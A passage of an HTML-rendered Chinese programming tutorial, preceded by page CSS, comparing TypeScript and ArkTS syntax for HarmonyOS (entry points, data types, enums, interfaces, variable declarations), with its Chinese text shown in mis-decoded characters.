H3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==") 10px 10px no-repeat;background-size:40px;background-color:#fdf8f8}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#fdf8f8}.markdown-body a{position:relative;text-decoration:underline;text-decoration-color:#ffd4d4;color:#ed7373;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{opacity:.66}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #ed7373;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#ed7373}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#fdf2f2}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #ed7373;background-color:#fdf2f2}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#ed7373}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]{appearance:none;-webkit-appearance:none;-moz-appearance:none;outline:none;width:16px;height:16px;border-radius:2px;background-color:transparent;box-shadow:inset 0 0 0 1px rgba(28,31,35,.3490196078);vertical-align:middle;margin:0;transform:translateY(-2px)}.markdown-body input[type=checkbox]:checked{background-color:#ed7373;background-image:url("data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjFlbSIgaGVpZ2h0PSIxZW0iIGFyaWEtaGlkZGVuPSJ0cnVlIj48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTE3LjQxMSA3LjMwOGExLjUgMS41IDAgMDEuMjggMi4xMDNsLTYuNSA4LjVhMS41IDEuNSAwIDAxLTIuMzc1LjAxbC0zLjUtNC41YTEuNSAxLjUgMCAxMTIuMzY4LTEuODQybDIuMzA2IDIuOTY1IDUuMzE4LTYuOTU1YTEuNSAxLjUgMCAwMTIuMTAzLS4yOHoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=");box-shadow:inset 0 0 0 1px #ed7373}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">HarmonyOSé€‰æ‹©ArkTSçš„åŸå› </h2>
<ol>
<li>
<p><strong>TypeScriptè¶…é›†</strong>ï¼šArkTSæ˜¯TypeScriptçš„è¶…é›†ï¼Œä¿ç•™äº†TypeScriptçš„æ ¸å¿ƒç‰¹æ€§ï¼Œé™ä½äº†å¼€å‘è€…çš„å­¦ä¹ æˆæœ¬ï¼Œä½¿å¾—ç†Ÿæ‚‰TypeScriptçš„å¼€å‘è€…èƒ½å¤Ÿå¿«é€Ÿä¸Šæ‰‹ã€‚</p>
</li>
<li>
<p><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šArkTSé’ˆå¯¹é¸¿è’™ç³»ç»Ÿè¿›è¡Œäº†æ·±åº¦ä¼˜åŒ–ï¼Œæä¾›äº†æ›´å¥½çš„è¿è¡Œæ—¶æ€§èƒ½å’Œæ›´ä½çš„å†…å­˜å è€—ï¼Œç‰¹åˆ«æ˜¯åœ¨å£°æ˜å¼UIæ¡†æ¶ArkUIä¸­è¡¨ç°å‡ºè‰²ã€‚</p>
</li>
<li>
<p><strong>ç±»å‹å®‰å…¨å¢å¼º</strong>ï¼šç›¸æ¯”TypeScriptï¼ŒArkTSè¿›ä¸€æ­¥å¼ºåŒ–äº†ç±»å‹ç³»ç»Ÿï¼Œç¦ç”¨äº†ä¸€äº›åŠ¨æ€ç‰¹æ€§ï¼ˆå¦‚anyç±»å‹çš„éƒ¨åˆ†ç”¨æ³•ï¼‰ï¼Œæä¾›æ›´ä¸¥æ ¼çš„ç±»å‹æ£€æŸ¥ï¼Œå‡å°‘è¿è¡Œæ—¶é”™è¯¯ã€‚</p>
</li>
<li>
<p><strong>ç”Ÿæ€æ•´åˆ</strong>ï¼šArkTSä¸é¸¿è’™ç”Ÿæ€æ·±åº¦é›†æˆï¼Œæä¾›äº†ä¸°å¯Œçš„ç³»ç»ŸAPIå’Œç»„ä»¶åº“ï¼Œèƒ½å¤Ÿå……åˆ†å‘æŒ¥é¸¿è’™ç³»ç»Ÿçš„åˆ†å¸ƒå¼èƒ½åŠ›å’Œè·¨è®¾å¤‡ååŒç‰¹æ€§ã€‚</p>
</li>
</ol>
<h2 data-id="heading-1">åŸºç¡€è¯­æ³•</h2>
<h3 data-id="heading-2">ç¨‹åºå…¥å£</h3>
<p><strong>TypeScript:</strong></p>
<p>TypeScript/JavaScriptåº”ç”¨é€šå¸¸æ²¡æœ‰å›ºå®šçš„ç¨‹åºå…¥å£ï¼Œåœ¨Node.jsç¯å¢ƒä¸­ä¼šä»package.jsonæŒ‡å®šçš„å…¥å£æ–‡ä»¶å¼€å§‹æ‰§è¡Œï¼Œåœ¨æµè§ˆå™¨ç¯å¢ƒä¸­åˆ™ä»HTMLå¼•å…¥çš„è„šæœ¬å¼€å§‹æ‰§è¡Œã€‚</p>
<p><strong>ArkTS:</strong></p>
<p>ArkTSåº”ç”¨æœ‰æ˜ç¡®çš„å…¥å£ç‚¹ï¼Œé€šå¸¸åœ¨<code>entry/src/main/ets/entryability/EntryAbility.ets</code>æ–‡ä»¶ä¸­</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">UIAbility</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.app.ability.UIAbility'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-variable language_">window</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.window'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntryAbility</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">UIAbility</span> {
  <span class="hljs-title function_">onCreate</span>(<span class="hljs-params">want, launchParam</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">'Ability onCreate'</span>);
  }

  <span class="hljs-title function_">onWindowStageCreate</span>(<span class="hljs-params">windowStage: <span class="hljs-variable language_">window</span>.WindowStage</span>) {
    windowStage.<span class="hljs-title function_">loadContent</span>(<span class="hljs-string">'pages/Index'</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
      <span class="hljs-comment">// åŠ è½½é¡µé¢</span>
    });
  }
}
</code></pre>
<p>é¡µé¢å…¥å£é€šå¸¸åœ¨<code>pages/Index.ets</code>ä¸­ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// UIæ„å»º</span>
  }
}
</code></pre>
<h3 data-id="heading-3">æ•°æ®ç±»å‹</h3>
<h4 data-id="heading-4">åŸºæœ¬ç±»å‹</h4>
<p><strong>TypeScriptä¸ArkTSå…±åŒæ”¯æŒçš„ç±»å‹ï¼š</strong></p>
<ul>
<li><code>boolean</code>: å¸ƒå°”ç±»å‹</li>
<li><code>number</code>: æ•°å­—ç±»å‹</li>
<li><code>string</code>: å­—ç¬¦ä¸²ç±»å‹</li>
<li><code>null</code>: ç©ºå€¼</li>
<li><code>undefined</code>: æœªå®šä¹‰</li>
<li><code>bigint</code>: å¤§æ•´æ•°ï¼ˆES2020+ï¼‰</li>
<li><code>symbol</code>: ç¬¦å·ç±»å‹</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScript &amp; ArkTS</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">isDone</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">10</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">"HarmonyOS"</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">big</span>: <span class="hljs-built_in">bigint</span> = <span class="hljs-number">100n</span>;
</code></pre>
<h4 data-id="heading-5">Arrayï¼ˆæ•°ç»„ï¼‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">list1</span>: <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">let</span> <span class="hljs-attr">list2</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">number</span>&gt; = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ¨èä½¿ç”¨ç±»å‹æ³¨è§£</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">list1</span>: <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">let</span> <span class="hljs-attr">list2</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">number</span>&gt; = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];

<span class="hljs-comment">// ArkTSä¸­æ•°ç»„æ“ä½œä¸TSåŸºæœ¬ä¸€è‡´</span>
list1.<span class="hljs-title function_">push</span>(<span class="hljs-number">4</span>);
list1.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(item.<span class="hljs-title function_">toString</span>());
});
</code></pre>
<h4 data-id="heading-6">Tupleï¼ˆå…ƒç»„ï¼‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">tuple</span>: [<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>] = [<span class="hljs-string">'hello'</span>, <span class="hljs-number">10</span>];
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSåŒæ ·æ”¯æŒå…ƒç»„</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">tuple</span>: [<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>] = [<span class="hljs-string">'hello'</span>, <span class="hljs-number">10</span>];
<span class="hljs-keyword">let</span> <span class="hljs-attr">first</span>: <span class="hljs-built_in">string</span> = tuple[<span class="hljs-number">0</span>];
<span class="hljs-keyword">let</span> <span class="hljs-attr">second</span>: <span class="hljs-built_in">number</span> = tuple[<span class="hljs-number">1</span>];
</code></pre>
<h4 data-id="heading-7">Enumï¼ˆæšä¸¾ï¼‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span> {
  <span class="hljs-title class_">Red</span>,
  <span class="hljs-title class_">Green</span>,
  <span class="hljs-title class_">Blue</span>
}

<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Status</span> {
  <span class="hljs-title class_">Success</span> = <span class="hljs-string">'SUCCESS'</span>,
  <span class="hljs-title class_">Fail</span> = <span class="hljs-string">'FAIL'</span>
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒæ•°å­—æšä¸¾å’Œå­—ç¬¦ä¸²æšä¸¾</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span> {
  <span class="hljs-title class_">Red</span>,
  <span class="hljs-title class_">Green</span>,
  <span class="hljs-title class_">Blue</span>
}

<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Status</span> {
  <span class="hljs-title class_">Success</span> = <span class="hljs-string">'SUCCESS'</span>,
  <span class="hljs-title class_">Fail</span> = <span class="hljs-string">'FAIL'</span>
}

<span class="hljs-keyword">let</span> <span class="hljs-attr">color</span>: <span class="hljs-title class_">Color</span> = <span class="hljs-title class_">Color</span>.<span class="hljs-property">Red</span>;
</code></pre>
<h4 data-id="heading-8">any å’Œ unknown</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">notSure</span>: <span class="hljs-built_in">any</span> = <span class="hljs-number">4</span>;
notSure = <span class="hljs-string">"maybe a string"</span>;
notSure = <span class="hljs-literal">false</span>;

<span class="hljs-keyword">let</span> <span class="hljs-attr">value</span>: <span class="hljs-built_in">unknown</span> = <span class="hljs-number">4</span>;
<span class="hljs-comment">// unknownç±»å‹æ›´å®‰å…¨ï¼Œä½¿ç”¨å‰éœ€è¦ç±»å‹æ£€æŸ¥</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'string'</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value.<span class="hljs-title function_">toUpperCase</span>());
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSé™åˆ¶äº†anyçš„ä½¿ç”¨ï¼Œæ¨èä½¿ç”¨å…·ä½“ç±»å‹</span>
<span class="hljs-comment">// åœ¨æŸäº›åœºæ™¯ä¸‹å¯ä»¥ä½¿ç”¨ï¼Œä½†ä¼šæœ‰ç¼–è¯‘è­¦å‘Š</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">notSure</span>: <span class="hljs-built_in">any</span> = <span class="hljs-number">4</span>; <span class="hljs-comment">// ä¸æ¨è</span>

<span class="hljs-comment">// æ¨èä½¿ç”¨è”åˆç±»å‹æ›¿ä»£</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> = <span class="hljs-number">4</span>;
value = <span class="hljs-string">"string"</span>;
</code></pre>
<h4 data-id="heading-9">Objectï¼ˆå¯¹è±¡ï¼‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  email?: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// å¯é€‰å±æ€§</span>
}

<span class="hljs-keyword">let</span> <span class="hljs-attr">person</span>: <span class="hljs-title class_">Person</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Zhang San'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>
};
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSä¸­æ¥å£å®šä¹‰æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  email?: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">let</span> <span class="hljs-attr">person</span>: <span class="hljs-title class_">Person</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Zhang San'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>
};

<span class="hljs-comment">// ä¹Ÿå¯ä»¥ä½¿ç”¨class</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonClass</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
}
</code></pre>
<h3 data-id="heading-10">å˜é‡å£°æ˜</h3>
<h4 data-id="heading-11">letã€constã€var</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">var</span> oldStyle = <span class="hljs-string">'avoid using var'</span>; <span class="hljs-comment">// ä¸æ¨è</span>
<span class="hljs-keyword">let</span> mutableValue = <span class="hljs-string">'can change'</span>;
<span class="hljs-keyword">const</span> immutableValue = <span class="hljs-string">'cannot change'</span>;
</code></pre>
<p><strong>ArkTS:</strong></p>
